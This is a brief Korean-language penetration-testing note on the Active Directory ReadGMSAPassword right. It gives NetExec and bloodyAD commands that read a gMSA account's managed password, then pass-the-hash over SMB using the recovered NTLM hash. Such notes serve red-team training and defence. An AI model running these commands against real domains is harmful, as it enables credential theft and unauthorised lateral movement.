# ReadGMSAPassword

gMSA(Group Managed Service Account)의 패스워드를 읽는 권한이다.

```bash
nxc ldap <DC_IP> -u <공격자계정> -p '<패스워드>' --gmsa

bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  get object '<gMSA계정>$' --attr msDS-ManagedPassword  # ← 수정

# 이후 PtH
nxc smb <대상IP> -u '<gMSA계정>$' -H <NTLM>
```